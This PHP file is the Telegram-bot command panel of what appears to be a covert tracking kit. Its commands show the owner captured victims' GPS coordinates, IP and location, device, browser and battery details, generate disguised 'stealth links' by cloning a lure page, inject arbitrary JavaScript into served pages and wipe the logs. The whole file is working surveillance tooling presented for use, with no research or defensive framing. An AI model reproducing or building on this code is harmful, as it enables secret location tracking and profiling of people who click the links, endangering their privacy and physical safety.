<?php
require_once 'config.php';

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update || !isset($update['message'])) exit;

$message = $update['message'];
$chat_id = $message['chat']['id'];
$user_id = $message['from']['id'];
$text = $message['text'] ?? '';

if ($chat_id != $OWNER_ID || $user_id != $OWNER_ID) exit;

function send($msg) {
    global $chat_id;
    sendTelegramMessage($msg, $chat_id);
}

// Commands
switch (true) {
    case preg_match('/^\/start$/', $text):
        send("✅ Bot online.\nUse /menu to control system.");
        break;

    case preg_match('/^\/menu$/', $text):
        send("🔧 Control Menu:\n
📍 /logs - Latest captures  
🧠 /inject - Add new feature  
🔐 /toggle [feature] - Enable/disable  
🔗 /shorten [url] - Generate stealth link  
⚙️ /config - View current config  
🧹 /clear - Purge all logs  
💾 /db - Set database credentials  
📨 /settoken - Update Telegram token  
🔁 /restart - Restart system");
        break;

    case preg_match('/^\/logs$/', $text):
        $db = getDatabase();
        $rows = $db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 5")->fetchAll(PDO::FETCH_ASSOC);
        if (!$rows) {
            send("📭 No logs found.");
            break;
        }
        foreach ($rows as $log) {
            $msg = "📌 <b>Session:</b> {$log['session_id']}\n";
            $msg .= "📍 {$log['lat']}, {$log['lon']} ±{$log['accuracy']}m\n";
            $msg .= "📱 {$log['device']} - {$log['browser']}\n";
            $msg .= "🌐 {$log['ip']} ({$log['location']})\n";
            $msg .= "🔋 {$log['battery']}% " . ($log['charging'] ? '⚡' : '') . ", Theme: {$log['theme']}\n";
            $msg .= "🕒 {$log['created_at']}";
            send($msg);
        }
        break;

    case preg_match('/^\/clear$/', $text):
        $db = getDatabase();
        $db->query("DELETE FROM logs");
        send("🧹 All logs cleared.");
        break;

    case preg_match('/^\/inject\s+(.+)/', $text, $m):
        $feature = trim($m[1]);
        file_put_contents("pages/feature_".time().".js", $feature);
        send("🧠 Feature injected.");
        break;

    case preg_match('/^\/toggle\s+(\w+)/', $text, $m):
        $feature = strtolower($m[1]);
        $path = "data/feature_{$feature}.enabled";
        if (file_exists($path)) {
            unlink($path);
            send("❌ Feature <b>$feature</b> disabled.");
        } else {
            file_put_contents($path, '1');
            send("✅ Feature <b>$feature</b> enabled.");
        }
        break;

    case preg_match('/^\/shorten\s+(.+)/', $text, $m):
        $url = trim($m[1]);
        $short = substr(md5($url.time()), 0, 6);
        $path = "pages/{$short}.html";
        copy("index.html", $path);
        file_put_contents("data/shortlinks/{$short}.txt", $url);
        send("🔗 Short link created: https://yourdomain.com/pages/$short.html");
        break;

    case preg_match('/^\/db$/', $text):
        send("🔐 Current DB:\nHost: ".DB_HOST."\nUser: ".DB_USER."\nName: ".DB_NAME);
        break;

    case preg_match('/^\/settoken\s+(.+)/', $text, $m):
        $new = trim($m[1]);
        file_put_contents("data/token.txt", $new);
        send("🤖 Telegram token updated.");
        break;

    case preg_match('/^\/restart$/', $text):
        send("🔁 Restarting...");
        exit;
        break;

    default:
        send("❓ Unknown command. Use /menu");
        break;
}
